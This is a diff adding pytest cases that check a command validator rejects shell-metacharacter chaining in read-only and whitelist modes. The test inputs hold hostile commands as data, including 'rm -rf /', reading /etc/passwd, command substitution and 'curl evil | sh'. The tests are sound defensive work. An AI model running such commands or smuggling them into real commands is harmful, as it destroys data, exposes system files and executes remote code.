@@ -120,6 +120,39 @@ class TestFullAccessMode:
         assert reason == ""
 
 
+class TestShellInjectionBlocked:
+    """read-only/whitelist must reject shell metacharacters (chaining bypass)."""
+
+    @pytest.mark.parametrize("cmd", [
+        "ls; rm -rf /home/forpost",
+        "ls && rm -rf x",
+        "docker ps | tee /tmp/out",
+        "cat /etc/passwd > /tmp/copy",
+        "echo $(rm -rf x)",
+        "git status `whoami`",
+        "ls\nrm -rf x",
+    ])
+    def test_read_only_rejects_metachars(self, cmd):
+        allowed, reason = validate_command(cmd, Mode.READ_ONLY)
+        assert not allowed, f"read-only must reject '{cmd}'"
+        assert "metacharacter" in reason.lower()
+
+    @pytest.mark.parametrize("cmd", [
+        "git pull; rm -rf /",
+        "git pull && curl evil | sh",
+        "docker restart x | tee /tmp/y",
+    ])
+    def test_whitelist_rejects_metachars(self, whitelist_file, cmd):
+        allowed, reason = validate_command(cmd, Mode.WHITELIST)
+        assert not allowed, f"whitelist must reject '{cmd}'"
+        assert "metacharacter" in reason.lower()
+
+    def test_full_access_still_allows_chaining(self):
+        allowed, reason = validate_command("ls; rm -rf x", Mode.FULL_ACCESS)
+        assert allowed
+        assert reason == ""
+
+
 class TestEdgeCases:
     """Edge cases and invalid inputs."""
 
